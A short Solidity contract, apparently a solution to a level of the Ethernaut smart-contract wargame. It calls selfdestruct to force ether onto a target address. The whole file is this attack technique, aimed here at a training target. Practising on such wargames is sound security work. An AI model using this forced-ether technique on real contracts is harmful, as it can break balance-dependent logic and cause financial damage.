
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Ethernaut.sol";

contract Attacker {
    Ethernaut ethernaut;

    constructor(address _ethernaut) {
        ethernaut = Ethernaut(_ethernaut);
    }

  function attack() public payable {
      selfdestruct(payable(address(ethernaut)));
  }
}
